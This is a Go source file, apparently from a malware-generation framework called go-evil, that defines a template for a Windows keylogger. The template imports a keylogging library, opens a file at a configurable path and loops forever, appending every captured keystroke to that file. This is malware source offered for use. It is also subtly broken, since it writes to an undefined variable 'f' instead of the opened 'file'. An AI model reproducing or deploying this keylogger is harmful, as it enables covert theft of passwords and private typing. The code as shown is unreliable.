package keylogger

import (
	"github.com/s9rA16Bf4/go-evil/utility/structure/functions"
	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
)

func windowsInstance(func_name string, data_object *json.Json_t) {
	data_object.Add_go_function(functions.Go_func_t{
		Name:           func_name,
		Func_type:      "",
		Return_type:    "",
		Part_of_struct: "",
		Parameters:     []string{"repr_1 []int"},
		Gut: []string{
			"path := spine.variable.get(spine.alpha.construct_string(repr_1))",
			"keylogger := keylogger.NewKeylogger()",
			"file, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)",
			"if err != nil {",
			"spine.log(err.Error())",
			"return",
			"}",
			"defer file.Close()",
			"",

			"for {",
			"key := keylogger.GetKey()",
			"if key.Empty {",
			"continue",
			"}",
			"if _, err = f.WriteString(key.Rune); err != nil {",
			"spine.log(err.Error())",
			"return",
			"}",
			"}",
		},
	})

	data_object.Add_go_imports([]string{"github.com/kindlyfire/go-keylogger", "os"})
}
